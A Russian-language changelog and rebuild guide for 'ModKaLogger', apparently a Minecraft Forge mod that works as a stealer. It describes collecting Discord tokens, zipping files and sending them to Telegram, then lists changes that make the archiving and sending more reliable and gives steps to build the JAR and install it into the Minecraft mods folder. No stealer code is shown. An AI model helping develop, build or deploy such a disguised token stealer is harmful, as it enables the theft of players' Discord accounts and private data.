# Инструкции по пересборке ModKaLogger

## 🔧 Что было изменено

1. **Улучшена обработка ошибок при создании ZIP архива**
   - Теперь пропускаются файлы, которые не удалось прочитать
   - Не падает при удалении файлов во время архивирования

2. **Добавлено подробное логирование отправки файлов**
   - Логируется размер файла
   - Логируется успешность отправки
   - Логируется код ответа от Telegram API

3. **Добавлено логирование в Discord.java**
   - Логируется количество найденных токенов
   - Логируется отправка в Telegram

4. **Добавлено логирование в Telegram.java**
   - Логируется размер ZIP архива
   - Логируется начало отправки
   - Логируется завершение отправки

## 🚀 Как пересобрать

### Шаг 1: Очистить старую сборку
```bash
./gradlew.bat clean
```

### Шаг 2: Собрать новый JAR
```bash
./gradlew.bat build
```

### Шаг 3: Найти собранный JAR
```
build/libs/modkalogger-1.0.0.jar
```

### Шаг 4: Установить новый JAR
1. Удалите старый JAR из `%APPDATA%\.minecraft\mods\`
2. Скопируйте новый JAR в `%APPDATA%\.minecraft\mods\`

### Шаг 5: Перезагрузить Minecraft
- Закройте Minecraft
- Запустите Minecraft Launcher
- Выберите Forge 1.16.5
- Нажмите Play

## 🔍 Если что-то не работает

1. Проверьте логи: `%APPDATA%\.minecraft\logs\latest.log`
2. Убедитесь, что JAR скопирован правильно
3. Убедитесь, что Minecraft перезагружен
4. Пересоберьте мод с нуля: `./gradlew.bat clean build`
